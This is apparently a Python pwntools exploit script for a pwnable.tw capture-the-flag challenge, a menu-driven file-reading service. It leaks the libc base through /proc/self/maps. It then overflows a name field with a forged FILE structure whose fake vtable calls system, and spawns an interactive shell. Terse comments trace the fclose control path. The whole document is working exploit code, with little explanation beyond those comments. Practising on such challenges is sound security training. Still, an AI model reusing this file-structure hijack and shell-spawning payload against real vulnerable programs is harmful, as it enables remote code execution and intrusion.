from pwn import *

s = remote("chall.pwnable.tw", 10200)
_ = s.recvuntil("Your choice :")

def open(file):
	s.sendline(str(1))
	_ = s.recvuntil("want to see :")
	s.sendline(file)
	_ = s.recvuntil("Your choice :")
def read():
	s.sendline(str(2))
	_ = s.recvuntil("Your choice :")
def write():
	s.sendline(str(3))
	return s.recvuntil("Your choice :")
def close():
	s.sendline(str(4))
	_ = s.recvuntil("Your choice :")
def exit(name):
	s.sendline(str(5))
	_ = s.recvuntil("Leave your name :")
	s.sendline(name)
	_ = s.recv()			

if __name__ == "__main__":
	libc = ELF("libc_32.so.6")
	sys_off = libc.symbols['system']

	open("/proc/self/maps")
	read()

	read()
	ret = write()
	ret = "0x" + ret[25:33]
	libc_base = int(ret, 16)
	sys_addr = libc_base + sys_off
	close()
	# --------------------------------------------------
	'''
	# my control flow is as followed
	# fclose_0
	# cmp byte ptr [esi + 46h], 0 ==> False  <--- weird
	# test ah, 20h ==> False
	# and edx, 8000h ==> False <-- becase of this condition I set 0x8000 in (1)
	# test edx, edx ==> False
	#   - mov eax, [esi + 4Ch] ; esi is new_fp, so new_fp + 4c is vtable   (the 20th element)   <----- must read asm in libc file 
	#   - sub esp, 8
	#   - push 0
	#   - push esi
	#   - call dword ptr [eax + 8] ; vtable + 8 should be SYSTEM (2)
	'''
	payload = ""
	payload += p32(0xdfff8fff)*2
	payload += p32(sys_addr)
	payload += ';sh;'+"a"*16
	payload += p32(0x804b260)
	payload += "a"*40     # did not make sence here
	payload += p32(0x804b260)

	# ---------------------------------------------------
	exit(payload)

	s.interactive()
